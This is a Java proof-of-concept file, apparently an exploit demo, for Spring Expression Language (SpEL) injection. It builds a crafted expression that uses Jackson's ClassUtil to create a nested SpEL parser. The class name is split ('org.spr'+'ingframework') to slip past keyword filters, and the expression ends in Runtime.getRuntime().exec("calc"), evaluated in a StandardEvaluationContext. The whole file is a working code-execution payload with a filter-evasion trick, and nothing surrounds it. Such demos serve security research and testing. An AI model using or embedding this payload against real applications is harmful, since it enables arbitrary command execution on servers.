package exp;

import org.springframework.expression.EvaluationContext;
import org.springframework.expression.Expression;
import org.springframework.expression.ExpressionParser;
import org.springframework.expression.spel.standard.SpelExpressionParser;
import org.springframework.expression.spel.support.StandardEvaluationContext;

public class Spel {
    public static void main(String[] args) {
        //创建解析器
        ExpressionParser parser = new SpelExpressionParser();
        String spel = "T(com.fasterxml.jackson.databind.util.ClassUtil).createInstance\n" +
                "(\"\".getClass().forName(\"org.spr\"+\"ingframework.expression.spel.standard.SpelExpressionParser\"),true)\n" +
                ".parseExpression(\"T(java.lang.String).forName(\\\"java.lang.Runtime\\\").getRuntime().exec(\\\"calc\\\")\").getValue()";
//解析表达式
        Expression expression = parser.parseExpression(spel);
//构造上下文
        EvaluationContext context = new StandardEvaluationContext();

//求值，命令执行处
        System.out.println(expression.getValue(context));
    }
}
